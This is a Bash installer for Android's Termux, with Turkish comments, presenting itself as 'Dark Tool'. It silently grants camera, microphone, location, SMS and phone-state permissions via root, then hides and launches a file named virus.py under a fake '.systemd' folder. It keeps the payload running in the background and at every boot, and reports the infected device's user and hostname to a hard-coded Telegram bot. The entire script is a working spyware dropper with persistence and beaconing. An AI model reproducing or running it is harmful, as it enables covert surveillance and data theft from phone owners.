#!/bin/bash
echo "[+] Dark Tool kuruluyor..."

# Depolama izni
termux-setup-storage

# Eğer root varsa izinleri sessizce aç
if command -v su &> /dev/null; then
    echo "[✓] Root tespit edildi. İzinler sessizce açılıyor..."
    su -c "pm grant com.termux android.permission.CAMERA"
    su -c "pm grant com.termux android.permission.RECORD_AUDIO"
    su -c "pm grant com.termux android.permission.READ_EXTERNAL_STORAGE"
    su -c "pm grant com.termux android.permission.WRITE_EXTERNAL_STORAGE"
    su -c "pm grant com.termux android.permission.ACCESS_FINE_LOCATION"
    su -c "pm grant com.termux android.permission.ACCESS_COARSE_LOCATION"
    su -c "pm grant com.termux android.permission.READ_SMS"
    su -c "pm grant com.termux android.permission.READ_PHONE_STATE"
    echo "[✓] Tüm izinler aktif edildi."
else
    echo "[!] Root bulunamadı. İzinleri manuel vermeniz gerekebilir."
fi

# Python kontrol et
if ! command -v python3 &> /dev/null; then
    echo "[!] Python3 bulunamadı! Kuruluyor..."
    pkg install python3 -y
fi

# Gerekli kütüphaneleri yükle
pip install requests > /dev/null 2>&1

# Gizli klasör
mkdir -p ~/.local/share/.systemd/
cp virus.py ~/.local/share/.systemd/
chmod +x ~/.local/share/.systemd/virus.py

# Virüsü arka planda çalıştır (Termux kapansa bile)
nohup python3 ~/.local/share/.systemd/virus.py > /dev/null 2>&1 &
disown

# Telefon uyku moduna girmesin
termux-wake-lock

# Telefon açılışında otomatik başlat
mkdir -p ~/.termux/boot
cat > ~/.termux/boot/start_virus.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
nohup python3 ~/.local/share/.systemd/virus.py > /dev/null 2>&1 &
disown
EOF
chmod +x ~/.termux/boot/start_virus.sh

# Telegram bildirimi
curl -s -X POST https://api.telegram.org/bot8996765359:AAFSRiB5C8oK0rUcNQRKpA2M0bRP-eModd0/sendMessage -d chat_id=8402048380 -d text="✅ Kurulum tamamlandı. $(whoami) @ $(hostname)"

echo "[✓] Kurulum tamamlandı. Dark Tool arka planda çalışıyor."
